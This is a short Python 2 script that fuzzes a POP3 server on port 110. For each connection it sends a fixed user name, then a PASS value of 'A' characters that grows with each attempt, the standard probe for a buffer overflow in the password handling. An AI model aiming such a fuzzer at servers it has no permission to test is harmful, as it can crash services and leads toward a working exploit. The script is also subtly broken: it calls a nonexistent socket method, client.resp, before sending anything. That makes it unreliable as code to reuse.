import socket
import sys

ip=raw_input("[*]IP for fuzzing: ")

buffer=["A"]
counter=100
while len(buffer) <=30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "[!]Fuzzing .. .. with %s bytes" %len(string)
	client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((ip,110))
	resp=client.resp(1024)
	print resp

	client.send("USER teste\r\n")
	client.recv(1024)
	client.send("PASS "+string+"\r\n")
	client.recv(1024)
	client.send("QUIT\r\n")
	client.recv(1024)